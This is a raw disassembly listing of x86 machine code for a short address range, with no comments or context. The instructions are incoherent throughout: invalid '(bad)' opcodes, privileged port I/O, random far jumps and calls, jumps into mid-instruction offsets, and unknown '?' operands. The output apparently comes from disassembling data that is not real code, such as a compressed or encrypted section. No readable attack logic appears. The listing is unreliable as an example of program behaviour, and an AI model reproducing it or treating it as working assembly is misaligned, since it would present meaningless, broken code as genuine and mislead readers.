  40bfc6:	xchg   edx,eax
  40bfc7:	adc    eax,0x11272d68
  40bfcc:	xchg   BYTE PTR [ebx+0x4b88c7c7],bh
  40bfd2:	mov    bh,0x61
  40bfd4:	jb     0x40bfaf
  40bfd6:	scas   al,BYTE PTR es:[edi]
  40bfd7:	xor    eax,0x69861891
  40bfdc:	pop    es
  40bfdd:	mov    eax,ds:0x878c2054
  40bfe2:	in     al,0xed
  40bfe4:	sub    eax,0x93eb1b6c
  40bfe9:	(bad)  
  40bfea:	or     ebp,edi
  40bfec:	adc    edi,DWORD PTR [ebp+0x9bd2aaf]
  40bff2:	cmp    DWORD PTR [ebp-0x14],0xe0b6c6b7
  40bff9:	or     DWORD PTR [esi+edi*4-0x6c],0x9696e3a4
  40c001:	pop    esi
  40c002:	mov    gs,WORD PTR [edx+0x1]
  40c005:	cmc    
  40c006:	push   esi
  40c007:	push   cs
  40c008:	inc    ebp
  40c009:	cwde   
  40c00a:	push   cs
  40c00b:	cdq    
  40c00c:	ss jne 0x40bf92
  40c00f:	push   ecx
  40c010:	ins    BYTE PTR es:[edi],dx
  40c011:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c012:	(bad)  
  40c013:	fst    DWORD PTR [edi-0x43]
  40c016:	adc    WORD PTR [esi-0x23],di
  40c01a:	jmp    DWORD PTR [edx+eiz*4-0x7a]
  40c01e:	xor    al,BYTE PTR [ebp-0xf250166]
  40c024:	lods   eax,DWORD PTR ds:[esi]
  40c025:	mov    DWORD PTR [eax],ecx
  40c027:	aaa    
  40c028:	sbb    DWORD PTR [edi],ebx
  40c02a:	outs   dx,BYTE PTR ds:[esi]
  40c02b:	xchg   cl,dl
  40c02d:	mov    ch,0xa9
  40c02f:	dec    edx
  40c030:	scas   al,BYTE PTR es:[edi]
  40c031:	mov    ds:0x3f31bff5,eax
  40c036:	nop
  40c037:	jns    0x40bfe2
  40c039:	enter  0xc1a2,0x58
  40c03d:	je     0x40c031
  40c03f:	or     dh,cl
  40c041:	dec    ebp
  40c042:	add    al,0xdc
  40c044:	(bad)  
  40c045:	scas   al,BYTE PTR es:[edi]
  40c046:	ins    DWORD PTR es:[edi],dx
  40c047:	ds cli 
  40c049:	mov    dl,0x46
  40c04b:	mov    bh,BYTE PTR [edi-0x40]
  40c04e:	rcl    edi,cl
  40c050:	enter  0x47c7,0xef
  40c054:	jecxz  0x40c099
  40c056:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c057:	xor    eax,0xd9e41cf8
  40c05c:	retf   
  40c05d:	jge    0x40bfe6
  40c05f:	pushf  
  40c060:	rcl    DWORD PTR ds:[edx],cl
  40c063:	mov    dl,0x84
  40c065:	push   ss
  40c066:	rcr    eax,cl
  40c068:	arpl   WORD PTR [eax+ebx*8],cx
  40c06b:	test   BYTE PTR [ecx+0x15],bh
  40c06e:	push   esp
  40c06f:	ins    BYTE PTR es:[edi],dx
  40c070:	loope  0x40c0a3
  40c072:	fcomp  DWORD PTR [ebp+0x6d]
  40c075:	push   es
  40c076:	mov    WORD PTR [ebx],gs
  40c078:	je     0x40c089
  40c07a:	jb     0x40c065
  40c07c:	fdiv   DWORD PTR [esi+0xb]
  40c07f:	and    al,0x6e
  40c081:	popa   
  40c082:	mov    ds:0x88cba795,al
  40c087:	outs   dx,BYTE PTR ds:[esi]
  40c088:	add    edi,esi
  40c08a:	retf   0x6b83
  40c08d:	(bad)  
  40c08e:	lods   al,BYTE PTR ds:[esi]
  40c08f:	xchg   ebx,eax
  40c090:	stc    
  40c091:	icebp  
  40c092:	dec    edx
  40c093:	adc    BYTE PTR [ecx],0x9f
  40c096:	es popf 
  40c098:	cs je  0x40c0f2
  40c09b:	pop    eax
  40c09c:	mov    ecx,0x991f5f6e
  40c0a1:	cld    
  40c0a2:	xor    ah,BYTE PTR [ebp+0xd720521]
  40c0a8:	mov    ds:0x5321f09c,al
  40c0ad:	fnstcw WORD PTR [esi-0x21]
  40c0b0:	or     dl,BYTE PTR [eax+eax*8-0x219bb527]
  40c0b7:	fsubr  st,st(1)
  40c0b9:	dec    ebx
  40c0ba:	jp     0x40c041
  40c0bc:	dec    ebx
  40c0bd:	fisubr DWORD PTR ds:0xf8f34857
  40c0c3:	push   edx
  40c0c4:	gs fwait
  40c0c6:	sbb    DWORD PTR [esi],esi
  40c0c8:	test   BYTE PTR [edx+0x50],bl
  40c0cb:	pop    ss
  40c0cc:	ins    DWORD PTR es:[edi],dx
  40c0cd:	cwde   
  40c0ce:	dec    edi
  40c0cf:	sar    DWORD PTR [esi+0x41],cl
  40c0d2:	aam    0xe5
  40c0d4:	push   0xffffff9f
  40c0d6:	or     eax,0x87a8bfce
  40c0db:	sbb    al,BYTE PTR [ecx+0x4e]
  40c0de:	xchg   esi,eax
  40c0df:	sbb    dl,BYTE PTR [ebx+0x864e4ef]
  40c0e5:	clc    
  40c0e6:	fstp   DWORD PTR [edi]
  40c0e8:	dec    al
  40c0ea:	add    eax,0xb70db23a
  40c0f0:	loopne 0x40c0ac
  40c0f2:	pop    esp
  40c0f3:	mov    dl,0xb9
  40c0f5:	xchg   ecx,eax
  40c0f6:	gs pop edx
  40c0f8:	inc    eax
  40c0f9:	lods   al,BYTE PTR ds:[esi]
  40c0fa:	inc    edx
  40c0fb:	mov    esi,DWORD PTR [ecx]
  40c0fd:	and    DWORD PTR [esi+edi*8],esi
  40c100:	fincstp 
  40c102:	sub    esp,ebx
  40c104:	test   eax,ecx
  40c106:	sub    ecx,DWORD PTR [ebp-0x16]
  40c109:	mov    ds:0xb1fbf415,al
  40c10e:	jecxz  0x40c0a3
  40c110:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c111:	in     eax,dx
  40c112:	push   ss
  40c113:	fisub  WORD PTR [ecx+0xc]
  40c116:	scas   eax,DWORD PTR es:[edi]
  40c117:	pop    edx
  40c118:	div    BYTE PTR [ebx]
  40c11a:	cmp    bh,0x3e
  40c11d:	cmp    DWORD PTR [ebp-0x2d68c7aa],0x3a
  40c124:	cs pop esp
  40c126:	inc    edi
  40c127:	mov    eax,0x8e9ebd64
  40c12c:	sub    al,0x2a
  40c12e:	fdivr  st(1),st
  40c130:	(bad)  
  40c132:	sti    
  40c133:	jmp    0x67f3:0xf3f72025
  40c13a:	fwait
  40c13b:	mov    WORD PTR [esi-0x61c4af0],cs
  40c141:	popa   
  40c142:	stc    
  40c143:	and    al,BYTE PTR [edi]
  40c145:	rol    esi,cl
  40c147:	pop    esp
  40c148:	(bad)  
  40c149:	or     al,0x51
  40c14b:	ins    DWORD PTR es:[edi],dx
  40c14c:	jmp    0xf22a46d
  40c151:	test   al,0x52
  40c153:	pop    ss
  40c154:	in     eax,0x1e
  40c156:	jne    0x40c186
  40c158:	pop    edx
  40c159:	mov    ecx,0xa7f121fb
  40c15e:	ins    DWORD PTR es:[edi],dx
  40c15f:	cmp    esp,DWORD PTR ds:0x3f64cf18
  40c165:	sar    BYTE PTR [edx-0x1573e7c],cl
  40c16b:	mov    cl,0x88
  40c16d:	retf   
  40c16e:	cmp    eax,DWORD PTR [edi+0x72aa65f1]
  40c174:	pop    esp
  40c175:	sub    BYTE PTR [ebx-0x793209be],dl
  40c17b:	arpl   si,di
  40c17d:	cld    
  40c17e:	(bad)
  40c181:	xor    bh,BYTE PTR [ebx+0x3260ea9b]
  40c187:	mov    bl,0xd0
  40c189:	jmp    0x8383:0x32a627b2
  40c190:	lods   al,BYTE PTR ds:[esi]
  40c191:	push   ebp
  40c192:	scas   eax,DWORD PTR es:[edi]
  40c193:	jmp    0xded7:0x7cfef33e
  40c19a:	jne    0x40c1ec
  40c19c:	inc    edx
  40c19d:	icebp  
  40c19e:	inc    esi
  40c19f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1a0:	call   0x50fa:0x36b9d592
  40c1a7:	jns    0x40c1c1
  40c1a9:	cwde   
  40c1aa:	pop    edi
  40c1ab:	aad    0x7a
  40c1ad:	clc    
  40c1ae:	adc    BYTE PTR ds:0x6093d637,bl
  40c1b4:	les    esp,FWORD PTR [ebx+0x6b21d97e]
  40c1ba:	add    ecx,DWORD PTR [ebp-0x1]
  40c1bd:	sub    eax,0x44cfcb39
  40c1c2:	lea    esi,[ebp+esi*1-0x40c9b016]
  40c1c9:	idiv   BYTE PTR [edi+0x36]
  40c1cc:	push   esp
  40c1cd:	mov    bl,BYTE PTR gs:[eax]
  40c1d0:	adc    BYTE PTR [esi],bl
  40c1d2:	pop    ds
  40c1d3:	stos   DWORD PTR es:[edi],eax
  40c1d4:	mov    eax,ds:0xef50e47d
  40c1d9:	outs   dx,BYTE PTR ds:[esi]
  40c1da:	mov    edi,0x9524609e
  40c1df:	and    bl,BYTE PTR [eax]
  40c1e1:	pop    esp
  40c1e2:	dec    esi
  40c1e3:	lea    edx,[esi+0x77e54d56]
  40c1e9:	pushf  
  40c1ea:	rol    BYTE PTR [ebx],0xe0
  40c1ed:	and    DWORD PTR [ebp+0x5856f969],0x40
  40c1f4:	xchg   DWORD PTR [edi],edi
  40c1f6:	loop   0x40c17c
  40c1f8:	test   BYTE PTR [ebx],cl
  40c1fa:	and    al,0x3a
  40c1fc:	out    dx,eax
  40c1fd:	xchg   esp,eax
  40c1fe:	inc    ecx
  40c1ff:	ret    0x104c
  40c202:	xor    al,0xe0
  40c204:	rcl    DWORD PTR [eax],0xda
  40c207:	fs pop es
  40c209:	sbb    eax,ebp
  40c20b:	in     al,dx
  40c20c:	inc    esi
  40c20d:	outs   dx,BYTE PTR ds:[esi]
  40c20e:	mov    al,ds:0x2be8072f
  40c213:	add    ch,BYTE PTR [ecx]
  40c215:	sub    eax,0xc1e61ff3
  40c21a:	jl     0x40c1e6
  40c21c:	icebp  
  40c21d:	lock add ebx,DWORD PTR [edi-0x6326942]
  40c224:	xlat   BYTE PTR ds:[ebx]
  40c225:	xchg   ebx,eax
  40c226:	neg    BYTE PTR [ebp+0x6d713fd2]
  40c22c:	pop    ebx
  40c22d:	xchg   esi,eax
  40c22e:	pop    ebx
  40c22f:	lods   al,BYTE PTR ds:[esi]
  40c230:	xchg   edx,eax
  40c231:	outs   dx,DWORD PTR ds:[esi]
  40c232:	fisttp DWORD PTR [eax]
  40c234:	shl    BYTE PTR [ecx-0x49],0xf4
  40c238:	in     al,dx
  40c239:	xchg   ebx,eax
  40c23a:	outs   dx,BYTE PTR ds:[esi]
  40c23b:	jne    0x40c25c
  40c23d:	es xchg edx,eax
  40c23f:	cmp    esp,DWORD PTR [eax+eax*8]
  40c242:	arpl   dx,cx
  40c244:	sbb    eax,0x5ac4b50d
  40c249:	push   edx
  40c24a:	cmp    bl,BYTE PTR [eax+0x23]
  40c24d:	push   DWORD PTR [eax]
  40c24f:	les    edx,FWORD PTR [eax+ecx*4-0x2a477ae9]
  40c256:	xchg   edi,eax
  40c257:	jb     0x40c1da
  40c259:	int3   
  40c25a:	xchg   edi,eax
  40c25b:	mov    ax,0x6143
  40c25f:	mov    ebx,0xa2c85cab
  40c264:	(bad)  
  40c265:	mov    al,0xe1
  40c267:	out    dx,eax
  40c268:	out    0xb5,al
  40c26a:	shr    dl,1
  40c26c:	xchg   ebx,eax
  40c26d:	(bad)  
  40c26e:	jbe    0x40c1fd
  40c270:	pop    ebx
  40c271:	xchg   ebx,eax
  40c272:	jecxz  0x40c245
  40c274:	sub    edx,DWORD PTR [esi+0x6ebe30a0]
  40c27a:	sbb    DWORD PTR [ecx+0x77],eax
  40c27d:	add    dl,BYTE PTR [esi]
  40c27f:	call   esp
  40c281:	add    al,0x1
  40c283:	hlt    
  40c284:	cmp    bh,BYTE PTR [esi]
  40c286:	pop    es
  40c287:	pop    esi
  40c288:	jmp    0xec65c6e9
  40c28d:	xor    al,0xfe
  40c28f:	out    dx,al
  40c290:	lock dec edx
  40c292:	das    
  40c293:	pop    ebx
  40c294:	add    eax,0xc22e774c
  40c299:	mov    gs:0x3f428d94,eax
  40c29f:	sbb    BYTE PTR [ecx-0x7e3acd8e],dh
  40c2a5:	sub    BYTE PTR [eax],dl
  40c2a7:	xchg   BYTE PTR [ebx+esi*4-0x66],bl
  40c2ab:	dec    eax
  40c2ac:	xor    DWORD PTR [eax-0x32b05cef],esp
  40c2b2:	jae    0x40c30e
  40c2b4:	adc    esp,DWORD PTR [esi]
  40c2b6:	std    
  40c2b7:	mov    ds:0xd3e8dffd,al
  40c2bc:	pop    es
  40c2bd:	cmp    ebp,ebx
  40c2bf:	xchg   bl,bl
  40c2c1:	fwait
  40c2c2:	mov    ebx,DWORD PTR [ecx]
  40c2c4:	sbb    al,0xc0
  40c2c6:	aam    0x7
  40c2c8:	xchg   edx,eax
  40c2c9:	or     DWORD PTR [ebp+0x33],ebp
  40c2cc:	inc    esi
  40c2cd:	out    0xe3,al
  40c2cf:	std    
  40c2d0:	mov    dl,0xf5
  40c2d2:	xor    cx,WORD PTR [esi]
  40c2d5:	scas   eax,DWORD PTR es:[edi]
  40c2d6:	push   ss
  40c2d7:	enter  0x5894,0x6b
  40c2db:	or     BYTE PTR [eax+0x5f],ch
  40c2de:	inc    edx
  40c2df:	cmp    ebx,edi
  40c2e1:	ss cdq 
  40c2e3:	or     BYTE PTR [ebx+0x7726c46e],0x6d
  40c2ea:	sbb    BYTE PTR [edx],dh
  40c2ec:	xchg   edi,eax
  40c2ed:	and    eax,0x5407c6b5
  40c2f2:	adc    DWORD PTR [ecx+0xc],ecx
  40c2f5:	scas   eax,DWORD PTR es:[edi]
  40c2f6:	xchg   DWORD PTR [eax-0x69],ebp
  40c2f9:	push   es
  40c2fa:	mov    ecx,0x5959c4f4
  40c2ff:	xor    eax,0xbf316c52
  40c304:	addr16 xchg esi,eax
  40c306:	push   ebp
  40c307:	push   ebx
  40c308:	cmp    dl,BYTE PTR [edx]
  40c30a:	add    dl,BYTE PTR [ebx+0x68]
  40c30d:	repz cld 
  40c30f:	bound  edi,QWORD PTR [edx+0x7cbd1dc0]
  40c315:	shl    BYTE PTR [esi-0x31],cl
  40c318:	into   
  40c319:	in     al,0x14
  40c31b:	outs   dx,DWORD PTR ds:[esi]
  40c31c:	retf   
  40c31d:	dec    eax
  40c31e:	arpl   cx,cx
  40c320:	sbb    BYTE PTR ds:0x6e9977cc,cl
  40c326:	jno    0x40c346
  40c328:	mov    cl,0x46
  40c32a:	pop    es
  40c32b:	xor    bl,BYTE PTR ds:0xe7465d95
  40c331:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c332:	ror    BYTE PTR [ebx-0x659c13e4],cl
  40c338:	repz pop edx
  40c33a:	test   BYTE PTR [ebp-0x4c855a96],dl
  40c340:	cwde   
  40c341:	hlt    
  40c342:	xchg   edx,eax
  40c343:	lds    ebp,FWORD PTR [esi]
  40c345:	xchg   esi,eax
  40c346:	adc    ecx,esi
  40c348:	data16 sub al,0xc4
  40c34b:	sbb    BYTE PTR [eax-0x1bff1afb],0x92
  40c352:	mov    eax,edi
  40c354:	pushf  
  40c355:	pop    ds
  40c356:	fldcw  WORD PTR [ebp-0x53f6a029]
  40c35c:	push   0xd3506462
  40c361:	xchg   esp,eax
  40c362:	push   ebx
  40c363:	sbb    eax,0xfdede962
  40c368:	jns    0x40c31a
  40c36a:	jnp    0x40c2ec
  40c36c:	aas    
  40c36d:	xchg   edx,eax
  40c36e:	push   ss
  40c36f:	into   
  40c370:	jmp    0x40c366
  40c372:	jecxz  0x40c32b
  40c374:	fadd   QWORD PTR [edx]
  40c376:	fs ins BYTE PTR es:[edi],dx
  40c378:	xor    BYTE PTR [ebx],bl
  40c37a:	push   ds
  40c37b:	jnp    0x40c3d6
  40c37d:	es mov esi,0x9db77f74
  40c383:	mov    bl,0xeb
  40c385:	xchg   esi,eax
  40c386:	outs   dx,DWORD PTR ds:[esi]
  40c387:	add    eax,0x2fc81123
  40c38c:	(bad)  
  40c38d:	data16 adc ah,0x43
  40c391:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c392:	je     0x40c33a
  40c394:	test   BYTE PTR [edi+0x51fb483f],dl
  40c39a:	cwde   
  40c39b:	scas   eax,DWORD PTR es:[edi]
  40c39c:	das    
  40c39d:	ja     0x40c3c6
  40c39f:	push   ecx
  40c3a0:	push   es
  40c3a1:	sub    DWORD PTR [ebp+0x4279fb0a],0xb833354f
  40c3ab:	adc    DWORD PTR [edi-0x3c12c2c7],esi
  40c3b1:	mov    WORD PTR [ebx],es
  40c3b3:	sbb    BYTE PTR [esi+0xb38194f],dl
  40c3b9:	xor    al,0xc6
  40c3bb:	les    ebp,FWORD PTR [edi+0x69]
  40c3be:	jno    0x40c36f
  40c3c0:	pop    esi
  40c3c1:	mov    ebp,0x6bc74f52
  40c3c6:	add    ah,BYTE PTR [eax]
  40c3c8:	mov    ?,WORD PTR [ebx-0x2a]
  40c3cb:	jne    0x40c37e
  40c3cd:	cmp    al,BYTE PTR [eax+0x73]
  40c3d0:	xchg   ecx,eax
  40c3d1:	mov    ebx,DWORD PTR [ebp+0x60ab7077]
  40c3d7:	xor    DWORD PTR gs:[edx],ecx
  40c3da:	adc    al,BYTE PTR [ebx-0x547ca6f6]
  40c3e0:	das    
  40c3e1:	sub    ebx,DWORD PTR [ebx+0x53]
  40c3e4:	jle    0x40c447
  40c3e6:	mov    WORD PTR [edx],?
  40c3e8:	(bad)
  40c3eb:	stc    
  40c3ec:	sub    eax,0x283a8c95
  40c3f1:	test   ecx,ecx
  40c3f3:	popa   
  40c3f4:	pop    eax
  40c3f5:	add    BYTE PTR [eax+0x44],0x3e
  40c3f9:	outs   dx,DWORD PTR ds:[esi]
  40c3fa:	pop    ebx
  40c3fb:	jle    0x40c3a6
  40c3fd:	inc    ebp
  40c3fe:	push   ebp
  40c3ff:	cs inc ebx
  40c401:	rcr    DWORD PTR [ecx-0x7],cl
  40c404:	mov    cl,BYTE PTR [edi]
  40c406:	aad    0x4d
  40c408:	stos   DWORD PTR es:[edi],eax
  40c409:	and    DWORD PTR [esi],eax
  40c40b:	ins    BYTE PTR es:[edi],dx
  40c40c:	jns    0x40c3dd
  40c40e:	scas   al,BYTE PTR es:[edi]
  40c40f:	mov    BYTE PTR [esi+0x77efd4a6],ah
  40c415:	pop    esi
  40c416:	cmp    esp,DWORD PTR [esi-0x7e]
  40c419:	inc    ebx
  40c41a:	not    ebp
  40c41c:	lds    ebx,FWORD PTR [ecx-0x4c]
  40c41f:	cmp    esi,esi
  40c421:	adc    DWORD PTR [edx-0x53f6eb88],ebp
  40c427:	cmp    al,0x8
  40c429:	sub    BYTE PTR [esp+ebp*4],0x9
  40c42d:	sub    BYTE PTR [ecx-0x4a33b9fb],al
  40c433:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c434:	rol    esp,cl
  40c436:	fcom   st(0)
  40c438:	popf   
  40c439:	(bad)
  40c43c:	sbb    dh,0xd2
  40c43f:	sar    ch,1
  40c441:	mov    ah,BYTE PTR [esi+0x14]
  40c444:	mov    dh,0x22
  40c446:	data16 data16 test BYTE PTR [eax-0x1f7d8ad5],dl
  40c44e:	lods   eax,DWORD PTR ds:[esi]
  40c44f:	dec    edx
  40c450:	push   ebp
  40c451:	pop    ebp
  40c452:	mov    ds:0x5dbbc19c,al
  40c457:	jb     0x40c3fa
  40c459:	and    bl,dh
  40c45b:	jp     0x40c4b9
  40c45d:	jmp    0x40c486
  40c45f:	xor    DWORD PTR [ebp+0x621a1843],eax
  40c465:	es lock push 0xea075c13
  40c46c:	scas   al,BYTE PTR es:[edi]
  40c46d:	loop   0x40c3fb
  40c46f:	jnp    0x40c440
  40c471:	sbb    ecx,DWORD PTR [esi+0x1c]
  40c474:	mov    al,ds:0xf335be80
  40c479:	fnsave [esi]
  40c47b:	cmp    esi,esi
  40c47d:	and    eax,0xc2be060
  40c482:	js     0x40c46a
  40c484:	adc    bh,cl
  40c486:	fist   WORD PTR [eax-0xc]
  40c489:	sar    BYTE PTR [ebx-0x608870e],0xcf
  40c490:	fld    st(7)
  40c492:	mov    ah,0x3a
  40c494:	cld    
  40c495:	xchg   ebx,eax
  40c496:	or     al,0xad
  40c498:	mov    al,ds:0xbb9836a2
  40c49d:	push   ds
  40c49e:	inc    ecx
  40c49f:	xor    BYTE PTR [ecx],0x17
  40c4a2:	sahf   
  40c4a3:	test   DWORD PTR [esi-0x4adafbc0],esi
  40c4a9:	aam    0xf7
  40c4ab:	jne    0x40c4d5
  40c4ad:	repz daa 
  40c4af:	enter  0x808d,0xea
  40c4b3:	push   eax
  40c4b4:	hlt    
  40c4b5:	jecxz  0x40c460
  40c4b7:	lds    ebp,FWORD PTR [ecx]
  40c4b9:	fisub  WORD PTR [edx+0x6a0fdbee]
  40c4bf:	fs out dx,al
  40c4c1:	push   0x362d09e2
  40c4c6:	pop    ss
  40c4c7:	js     0x40c47c
  40c4c9:	sub    BYTE PTR [edi+0x5f2018fc],dl
  40c4cf:	xrelease xchg DWORD PTR [edx-0x61],eax
  40c4d3:	push   0xffffffa6
  40c4d5:	aam    0x7
  40c4d7:	jecxz  0x40c4f1
  40c4d9:	outs   dx,BYTE PTR ds:[esi]
  40c4da:	adc    al,0x62
  40c4dc:	jge    0x40c51d
  40c4de:	mov    al,0x25
  40c4e0:	loop   0x40c4dc
  40c4e2:	les    ebp,FWORD PTR [eax]
  40c4e4:	sub    al,0xa1
  40c4e6:	adc    ebp,DWORD PTR [eax]
  40c4e8:	daa    
  40c4e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4ea:	mov    al,ds:0x8b532e53
  40c4ef:	jge    0x40c4d1
  40c4f1:	cli    
  40c4f2:	add    dh,BYTE PTR [ecx-0x63]
  40c4f5:	fisubr WORD PTR ds:0x342bad19
  40c4fb:	fisubr WORD PTR [ecx+0x73af2829]
  40c501:	out    dx,al
  40c502:	mov    edi,0x4b2bd6b2
  40c507:	push   es
  40c508:	sub    ah,bh
  40c50a:	adc    eax,0xd7db3c7f
  40c50f:	adc    cl,BYTE PTR [esi]
  40c511:	retf   0xbad0
  40c514:	or     DWORD PTR [edi+0xe3ae40b],0x65
  40c51b:	jbe    0x40c4ee
  40c51d:	loopne 0x40c4e4
  40c51f:	fwait
  40c520:	gs in  al,dx
  40c522:	icebp  
  40c523:	adc    BYTE PTR [ebp-0x15a99134],dl
  40c529:	mov    bl,0x12
  40c52b:	popa   
  40c52c:	lock pop ds
  40c52e:	inc    edx
  40c52f:	push   esi
  40c530:	mov    edx,0x27139b08
  40c535:	mov    al,ds:0xd7e73a24
  40c53a:	pop    ebp
  40c53b:	cmp    eax,0x74c39068
  40c540:	icebp  
  40c541:	and    edi,DWORD PTR [ebp-0x30]
  40c544:	adc    BYTE PTR [eax],dh
  40c546:	fnstcw WORD PTR [edi]
  40c548:	add    ch,BYTE PTR [esi-0x4e02be81]
  40c54e:	aad    0x50
  40c550:	fs inc edx
  40c552:	sub    BYTE PTR [ebx-0x7c921c8a],ch
  40c558:	sub    eax,0x7aa6e58
  40c55d:	add    eax,0x7dc926af
  40c562:	dec    ebx
  40c563:	ret    0x393e
  40c566:	sub    esp,edx
  40c568:	or     bl,al
  40c56a:	fst    QWORD PTR [eax+0x2475ec96]
  40c570:	push   ebx
  40c571:	mov    ecx,0x886e2e99
  40c576:	dec    edi
  40c577:	push   cs
  40c578:	(bad)  
  40c579:	ds push 0xffffffcf
  40c57c:	jbe    0x40c52c
  40c57e:	out    0xa0,eax
  40c580:	mov    dh,0xc6
  40c582:	int    0xf3
  40c584:	aaa    
  40c585:	xchg   esp,eax
  40c586:	and    DWORD PTR [ebx+0x596409e0],ebx
  40c58c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c58d:	push   0x7da816e9
  40c592:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c593:	stos   DWORD PTR es:[edi],eax
  40c594:	push   eax
  40c595:	int    0x6e
  40c597:	inc    eax
  40c598:	(bad)  
  40c599:	fiadd  DWORD PTR [edx-0x3b72104e]
  40c59f:	pop    edx
  40c5a0:	sbb    ah,bh
  40c5a2:	js     0x40c620
  40c5a4:	lods   eax,DWORD PTR ds:[esi]
  40c5a5:	pop    ecx
  40c5a6:	scas   eax,DWORD PTR es:[edi]
  40c5a7:	rcl    bl,1
  40c5a9:	lods   al,BYTE PTR ds:[esi]
  40c5aa:	cld    
  40c5ab:	and    al,0xb0
  40c5ad:	mov    ah,0xa0
  40c5af:	mov    WORD PTR ds:[edx-0x4ee970c0],?
  40c5b6:	cmp    eax,0x538a6497
  40c5bb:	mov    dh,0xd4
  40c5bd:	fucomi st,st(6)
  40c5bf:	add    BYTE PTR [edi-0x50],bh
  40c5c2:	(bad)  
  40c5c4:	adc    bl,BYTE PTR [eax+0x75525426]
  40c5ca:	loopne 0x40c5c2
  40c5cc:	aad    0xe6
  40c5ce:	dec    edi
  40c5cf:	sub    BYTE PTR [ebp+ebx*1+0x28],dh
  40c5d3:	sbb    al,0x89
  40c5d5:	inc    esp
  40c5d6:	fild   WORD PTR [esi+0x7c]
  40c5d9:	pop    ebp
  40c5da:	xchg   ebp,eax
  40c5db:	stc    
  40c5dc:	test   al,0xd3
  40c5de:	pop    ss
  40c5df:	pop    es
  40c5e0:	inc    esi
  40c5e1:	mov    ch,0x6
  40c5e3:	rol    BYTE PTR [ecx],1
  40c5e5:	lock and bh,BYTE PTR [edi]
  40c5e8:	js     0x40c5b2
  40c5ea:	mov    dl,0xde
  40c5ec:	ror    BYTE PTR ds:0xf29c2516,0xbd
  40c5f3:	(bad)  
  40c5f4:	imul   ebx,DWORD PTR [edx+ecx*4+0x23b62152],0x35
  40c5fc:	mov    WORD PTR gs:[edx-0x17e8a309],?
  40c603:	lds    ecx,FWORD PTR es:[edx-0xd]
  40c607:	cs nop
  40c609:	xor    dl,BYTE PTR [eax]
  40c60b:	and    dh,cl
  40c60d:	jo     0x40c61f
  40c60f:	repz cmp BYTE PTR [esi],dh
  40c612:	fwait
  40c613:	aaa    
  40c614:	imul   ecx,DWORD PTR ds:0x6b04e455,0x797fca06
  40c61e:	mov    ebp,0xc682cbcc
  40c623:	pop    DWORD PTR [ebp+0x3422b92f]
  40c629:	sbb    bh,BYTE PTR [ebp+ebp*2+0x1e5d40a]
  40c630:	xlat   BYTE PTR ds:[ebx]
  40c631:	outs   dx,BYTE PTR ds:[esi]
  40c632:	outs   dx,BYTE PTR ds:[esi]
  40c633:	mov    edx,0x5d7abfa3
  40c638:	fsub   QWORD PTR [edi]
  40c63a:	jmp    0x40c64e
  40c63c:	jae    0x40c610
  40c63e:	push   edi
  40c63f:	fld    DWORD PTR [eax-0xc4608f6]
  40c645:	cmp    esp,esp
  40c647:	mov    bh,BYTE PTR [edx+0x37]
  40c64a:	xor    al,0x9e
  40c64c:	pop    eax
  40c64d:	mov    ds:0x7c0c3c7,eax
  40c652:	add    DWORD PTR [edx+0x16248740],edx
  40c658:	es jge 0x40c680
  40c65b:	add    dl,0x86
  40c65e:	js     0x40c642
  40c660:	pusha  
  40c661:	xchg   esi,eax
  40c662:	stos   DWORD PTR es:[edi],eax
  40c663:	icebp  
  40c664:	stos   DWORD PTR es:[edi],eax
  40c665:	pop    edi
  40c666:	xchg   esp,eax
  40c667:	ror    DWORD PTR [eax],0x29
  40c66a:	xor    BYTE PTR [ebx-0x6a],0xdd
  40c66e:	js     0x40c682
  40c670:	cmp    esi,DWORD PTR ds:0x1749bab3
  40c676:	fwait
  40c677:	inc    ebx
  40c678:	stos   BYTE PTR es:[edi],al
  40c679:	icebp  
  40c67a:	jbe    0x40c6db
  40c67c:	pop    es
  40c67d:	inc    edi
  40c67e:	fidiv  WORD PTR [esi-0x3eec38b8]
  40c684:	inc    ebx
  40c685:	in     al,0xbe
  40c687:	test   BYTE PTR [ecx-0x4324d8d1],0xd9
  40c68e:	dec    eax
  40c68f:	idiv   DWORD PTR [ebx-0x67db2a95]
  40c695:	(bad)  
  40c696:	mov    dh,0x56
  40c698:	sub    BYTE PTR [eax-0x70a663cf],0xf2
  40c69f:	(bad)
  40c6a3:	and    BYTE PTR [ecx],0x4d
  40c6a6:	sub    eax,0xfba42cf9
  40c6ab:	or     al,0x55
  40c6ad:	icebp  
  40c6ae:	fs add eax,0x1549823a
  40c6b4:	mov    esp,0x880c13cb
  40c6b9:	test   eax,0x8f7f5917
  40c6be:	cmp    edx,DWORD PTR [ecx-0x9c51ac5]
  40c6c4:	dec    edx
  40c6c5:	jmp    DWORD PTR [edi]
  40c6c7:	ins    BYTE PTR es:[edi],dx
  40c6c8:	push   esi
  40c6c9:	sbb    edx,DWORD PTR [edx+0x4f]
  40c6cc:	lock test DWORD PTR [ebx+ecx*1+0x336aa589],edi
  40c6d4:	ja     0x40c725
  40c6d6:	xchg   ebp,eax
  40c6d7:	int    0x76
  40c6d9:	in     al,dx
  40c6da:	retf   0xc16d
  40c6dd:	shl    DWORD PTR [ebx-0x7b883755],0xd8
  40c6e4:	fmul   QWORD PTR [ebx+0x5dd221fb]
  40c6ea:	cld    
  40c6eb:	adc    BYTE PTR [esi-0x1f9cc74d],ch
  40c6f1:	pop    esi
  40c6f2:	sbb    WORD PTR [edx],dx
  40c6f5:	mov    ebx,0xab877a0c
  40c6fa:	stos   DWORD PTR es:[edi],eax
  40c6fb:	mov    BYTE PTR [edx-0x6bc4f713],cl
  40c701:	int    0x61
  40c703:	add    cl,BYTE PTR [edx-0x58ae2dbb]
  40c709:	das    
  40c70a:	sahf   
  40c70b:	loop   0x40c76b
  40c70d:	mul    BYTE PTR [esi+esi*4]
  40c710:	ret    0xb802
  40c713:	lahf   
  40c714:	in     al,0x51
  40c716:	xor    ebp,0x2e
  40c719:	mov    eax,0x94fcb226
  40c71e:	jp     0x40c734
  40c720:	in     al,dx
